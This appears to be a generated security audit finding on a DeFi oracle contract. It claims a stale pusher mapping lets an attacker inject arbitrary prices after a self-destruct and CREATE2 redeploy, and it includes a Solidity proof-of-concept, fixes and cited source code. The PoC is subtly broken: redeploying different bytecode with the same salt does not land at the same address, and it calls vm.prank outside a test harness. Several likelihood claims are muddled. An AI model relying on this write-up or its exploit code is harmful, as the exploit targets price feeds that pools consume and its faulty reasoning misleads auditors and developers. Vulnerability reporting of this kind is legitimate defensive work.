### Title
Stale `namespaceRemapping` After Contract-Pusher Self-Destruct Enables Unauthorized Price Injection via CREATE2 Redeploy — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` verifies a contract pusher's consent via a one-time live `isPusher(creator)` staticcall and permanently writes `namespaceRemapping[pusher] = creator`. The `fallback` push path never re-verifies this consent. If the authorized contract pusher self-destructs and an attacker redeploys a malicious contract at the same address via CREATE2, the stale mapping grants the new contract unconditional write authority over the creator's oracle namespace, allowing arbitrary prices to be injected into feeds consumed by live pools.

---

### Finding Description

`allowContractPushers` performs a one-time live consent check: [1](#0-0) 

```solidity
function allowContractPushers(address[] calldata pushers) external {
    ...
    (bool ok, bytes memory res) = pusher.staticcall(
        abi.encodeWithSignature("isPusher(address)", msg.sender)
    );
    require(ok);
    bool allowed = abi.decode(res, (bool));
    require(allowed);

    namespaceRemapping[pusher] = msg.sender;   // ← written once, never re-checked
    emit PusherAuthorized(pusher, msg.sender);
}
```

The `fallback` push path resolves the namespace exclusively from this mapping, with no re-verification: [2](#0-1) 

```solidity
fallback() override external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0)) creator = msg.sender;
    // ← no isPusher() re-check; mapping is the sole authority
    ...
}
```

**Attack path:**

1. Attacker deploys `PusherContract` at a deterministic CREATE2 address. `PusherContract.isPusher(creator)` returns `true`.
2. Creator calls `allowContractPushers([address(PusherContract)])`. Consent check passes; `namespaceRemapping[PusherContract] = creator` is written.
3. Attacker calls `selfdestruct` on `PusherContract`, destroying it. The `namespaceRemapping` entry is **not cleared** — there is no hook or callback to do so.
4. Attacker redeploys a malicious contract at the identical address via CREATE2 with the same salt. The new contract has no `isPusher` function and is fully attacker-controlled.
5. Attacker calls the oracle's `fallback` from the new contract address. `namespaceRemapping[newContract]` still resolves to `creator`. The oracle writes attacker-supplied slot words into the creator's namespace.
6. Any `PriceProvider` or `AnchoredPriceProvider` bound to a `feedId` derived from `creator` now reads the injected price.

The analog to the NFTR bug is exact: the contract pusher is "burned" (self-destructed), its consent is gone, but the delegation record persists and cannot be self-cleared by the destroyed contract — mirroring the burned NFT whose registered name is permanently locked because the owner no longer exists to authorize changes.

---

### Impact Explanation

An attacker who controls the redeployed contract can push any `(price, spread0, spread1, timestamp)` tuple into the creator's oracle slots. The `fallback` enforces only timestamp monotonicity — it does not validate price bounds, spread sanity, or re-verify pusher authorization: [3](#0-2) 

The injected price flows through `getOracleData` → `PriceProvider._getBidAndAskPrice` / `AnchoredPriceProvider._readLeg` → `MetricOmmPool.swap`. A manipulated mid price shifts the entire bid/ask band, causing:

- Traders to receive more output tokens than the true oracle price permits (swap conservation failure).
- Pool reserves to be drained below LP claims (pool insolvency).
- `AnchoredPriceProvider`'s clamp to be anchored to the injected mid, making the clamp itself the attack surface rather than a defense. [4](#0-3) 

---

### Likelihood Explanation

- **Self-destruct availability**: `selfdestruct` remains available in Solidity ≥ 0.8.28 on non-Cancun chains (Ethereum pre-Cancun, HyperEVM). The protocol targets Ethereum, Base, and HyperEVM — at least one deployment context supports it.
- **CREATE2 redeploy**: Standard technique; no privileged access required beyond controlling the original deployer key.
- **Creator cooperation**: The creator must have called `allowContractPushers` for the original contract. This is a semi-trusted action, but the creator had no way to foresee the contract being replaced at the same address.
- **No on-chain detection**: The creator has no mechanism to detect that the contract at the authorized address has changed. `namespaceRemapping` stores only the address, not a code hash or deployment nonce.
- **No automatic revocation**: `removePushers` requires the creator to act; a destroyed contract cannot self-revoke.

---

### Recommendation

Re-verify pusher consent at push time, or bind the delegation to the contract's code hash at authorization time:

**Option A — Code-hash binding at delegation:**
```solidity
mapping(address => bytes32) public pusherCodeHash;

function allowContractPushers(address[] calldata pushers) external {
    for (...) {
        // existing isPusher check ...
        pusherCodeHash[pusher] = pusher.codehash;   // bind to current bytecode
        namespaceRemapping[pusher] = msg.sender;
    }
}
```
In `fallback`, add:
```solidity
if (creator != msg.sender) {
    require(msg.sender.codehash == pusherCodeHash[msg.sender], "pusher replaced");
}
```

**Option B — Live re-verification at push time:**
Re-call `isPusher(creator)` inside `fallback` for contract pushers (identified by `msg.sender.code.length > 0`). Fail closed if the call reverts or returns `false`.

**Option C — Emit a `PusherCodeHash` event** at delegation time so off-chain monitoring can detect address reuse, and document that creators must call `removePushers` if the authorized contract is ever destroyed.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {CompressedOracleV1} from ".../CompressedOracle.sol";
import {U64x32} from ".../U64x32.sol";

contract LegitPusher {
    address immutable _creator;
    constructor(address c) { _creator = c; }
    function isPusher(address who) external view returns (bool) { return who == _creator; }
    function destroy() external { selfdestruct(payable(msg.sender)); }
}

contract MaliciousPusher {
    // deployed at same CREATE2 address after LegitPusher.destroy()
    function pushBadPrice(address oracle, uint8 slotId) external {
        // price = U64x32.encode(type(uint32).max) — maximum possible price
        uint256 badWord = (uint256(type(uint32).max) << 16 | uint256(5) << 8 | uint256(5)) << 208
                        | (uint56(block.timestamp * 1000) << 8)
                        | uint256(slotId);
        (bool ok,) = oracle.call(abi.encodePacked(badWord));
        require(ok);
    }
}

contract PoC {
    function run(CompressedOracleV1 oracle, address creator, bytes32 salt) external {
        // 1. Deploy legit pusher at deterministic address
        LegitPusher legit = new LegitPusher{salt: salt}(creator);

        // 2. Creator authorizes it
        address[] memory pushers = new address[](1);
        pushers[0] = address(legit);
        vm.prank(creator);
        oracle.allowContractPushers(pushers);

        // 3. Destroy the legit pusher
        legit.destroy();

        // 4. Redeploy malicious contract at same address
        MaliciousPusher evil = new MaliciousPusher{salt: salt}();
        assert(address(evil) == address(legit)); // same address

        // 5. Push bad price into creator's namespace — succeeds because mapping is stale
        evil.pushBadPrice(address(oracle), 0);

        // 6. Verify bad price is now in creator's feed
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        assert(data.price == U64x32.decode(type(uint32).max)); // injected
    }
}
```

The `namespaceRemapping[address(evil)] == creator` check in `fallback` passes because the mapping was never cleared, and the bad price lands in the creator's namespace, ready to be consumed by any pool whose `PriceProvider` references that `feedId`. [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L214-234)
```text
    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-345)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L258-295)
```text
    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        (uint256 mid, uint256 spreadBps, , bool ok) = _readLeg(baseFeedId);
        if (!ok) return (0, type(uint128).max);

        bytes32 _quote = quoteFeedId;
        if (_quote != bytes32(0)) {
            (uint256 mid2, uint256 spreadBps2, , bool ok2) = _readLeg(_quote);
            if (!ok2 || mid2 == 0) return (0, type(uint128).max);
            // Synthetic ratio (8-decimal): mid1 / mid2. Relative uncertainties of a ratio add.
            mid = Math.mulDiv(mid, ORACLE_DECIMALS, mid2);
            spreadBps += spreadBps2;
        }

        return _computeBidAsk(mid, spreadBps);
    }

    /// @dev Reads one feed and runs its per-leg guards. ok=false (→ caller halts, fail closed) on:
    ///      stale reference, mid == 0, spreadBps == the off-hours/stall marker (spreadBps >= ORACLE_BPS), or a
    ///      priceGuard violation. Each leg is read through the attributed path independently.
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
```
